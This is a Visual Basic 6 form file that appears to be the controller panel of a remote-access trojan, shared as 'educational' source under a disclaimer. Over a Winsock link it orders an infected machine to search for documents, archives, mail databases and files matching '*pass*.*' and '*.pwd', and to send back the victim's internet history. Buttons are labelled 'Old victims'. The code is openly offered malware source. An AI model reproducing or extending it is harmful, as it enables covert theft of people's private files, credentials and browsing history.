VERSION 5.00
Begin VB.Form Form3 
   Appearance      =   0  'Flat
   BackColor       =   &H00E0E0E0&
   Caption         =   "Search files"
   ClientHeight    =   5790
   ClientLeft      =   165
   ClientTop       =   450
   ClientWidth     =   11565
   Icon            =   "Form3.frx":0000
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   ScaleHeight     =   5790
   ScaleWidth      =   11565
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Search Options"
      ForeColor       =   &H80000008&
      Height          =   5775
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   11535
      Begin Project1.lvButtons_H lvButtons_H4 
         Height          =   375
         Left            =   5160
         TabIndex        =   10
         ToolTipText     =   "Get internet history"
         Top             =   240
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   661
         Caption         =   "Get history"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H3 
         Height          =   375
         Left            =   8040
         TabIndex        =   9
         ToolTipText     =   "Search files on old version victims"
         Top             =   240
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   661
         Caption         =   "Old victims"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.ComboBox Combo1 
         Height          =   315
         Left            =   120
         TabIndex        =   8
         Top             =   240
         Width           =   3975
      End
      Begin Project1.lvButtons_H lvButtons_H1 
         Height          =   375
         Left            =   4200
         TabIndex        =   7
         ToolTipText     =   "Search for files"
         Top             =   240
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         Caption         =   "Search"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.ListBox List1 
         Appearance      =   0  'Flat
         Height          =   4515
         ItemData        =   "Form3.frx":08CA
         Left            =   120
         List            =   "Form3.frx":08CC
         TabIndex        =   3
         ToolTipText     =   "Search results"
         Top             =   1200
         Width           =   11295
      End
      Begin VB.TextBox Text1 
         Appearance      =   0  'Flat
         Height          =   375
         Left            =   120
         TabIndex        =   2
         ToolTipText     =   "Selected file path"
         Top             =   720
         Width           =   10455
      End
      Begin VB.TextBox Text2 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   10440
         TabIndex        =   1
         Text            =   "0"
         ToolTipText     =   "Total files found"
         Top             =   240
         Width           =   975
      End
      Begin Project1.lvButtons_H lvButtons_H2 
         Height          =   375
         Left            =   6720
         TabIndex        =   4
         ToolTipText     =   "Save results"
         Top             =   240
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         Caption         =   "Save"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H6 
         Height          =   375
         Left            =   10680
         TabIndex        =   5
         ToolTipText     =   "Copy the full path"
         Top             =   720
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   661
         Caption         =   "Copy"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.Label Label1 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total files:"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   9600
         TabIndex        =   6
         Top             =   240
         Width           =   735
      End
   End
   Begin VB.Menu oldserachmenu1 
      Caption         =   "oldserachmenu"
      Visible         =   0   'False
      Begin VB.Menu doc 
         Caption         =   "*.doc"
      End
      Begin VB.Menu xls 
         Caption         =   "*.xls"
      End
      Begin VB.Menu zip 
         Caption         =   "*.zip"
      End
   End
   Begin VB.Menu cleara 
      Caption         =   "Clear"
      Visible         =   0   'False
      Begin VB.Menu clearlist 
         Caption         =   "Clear"
      End
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Private Sub Command6_Click()
    Me.Hide
End Sub

'clear the list
Private Sub clearlist_Click()
    List1.Clear
End Sub

Private Sub doc_Click()
    Form1.Winsock1.SendData "*.doc"
End Sub



Private Sub Form_Load()
    'search strings
    Combo1.AddItem "*.doc"
    Combo1.AddItem "*.xls"
    Combo1.AddItem "*.xml"
    Combo1.AddItem "*.zip"
    Combo1.AddItem "*.rar"
    Combo1.AddItem "*.pwd"
    Combo1.AddItem "*.pdf"
    Combo1.AddItem "*.dbx"
    Combo1.AddItem "*.dat"
    Combo1.AddItem "*.jpg"
    Combo1.AddItem "*.jpeg"
    Combo1.AddItem "*.bmp"
    Combo1.AddItem "*.avi"
    Combo1.AddItem "*.idx"
    Combo1.AddItem "*pass*.*"
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Me.Hide
    Cancel = 1
End Sub




Private Sub Frame1_DragDrop(Source As Control, X As Single, Y As Single)

End Sub

Private Sub List1_Click()
    Dim qsee As Long
    qsee = List1.ListIndex
    Text1.Text = List1.List(qsee)
End Sub

Private Sub List1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu cleara
    End If
End Sub

Private Sub lvButtons_H1_Click()
    List1.Clear
    Form1.Text2.Text = "Searching for " & Combo1.Text & " please wait...."
    Form1.Winsock1.SendData Combo1.Text & "#"
End Sub

Private Sub lvButtons_H2_Click()
    Dim i As Long
    Form1.CDialog1.ShowSave
    Open Form1.CDialog1.Filename & ".txt" For Output As #1
        For i = 0 To List1.ListCount
            Print #1, List1.List(i)
        Next i
    Close #1
End Sub

'list  right click menu
Private Sub lvButtons_H3_Click()
  PopupMenu oldserachmenu1
End Sub

Private Sub lvButtons_H4_Click()
    List1.Clear
    Form1.Text2.Text = "Gettting history plz wait"
    Form1.Winsock1.SendData "history"
End Sub

Private Sub lvButtons_H5_Click()
    List1.Clear
    Form1.Text2.Text = "Searching excel files plz wait"
    Form1.Winsock1.SendData "*.doc"
End Sub

Private Sub lvButtons_H6_Click()
    Clipboard.Clear
    Clipboard.SetText Text1.Text
End Sub

Private Sub xls_Click()
    Form1.Winsock1.SendData "*.xls"
End Sub

Private Sub zip_Click()
    Form1.Winsock1.SendData "*.zip"
End Sub
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
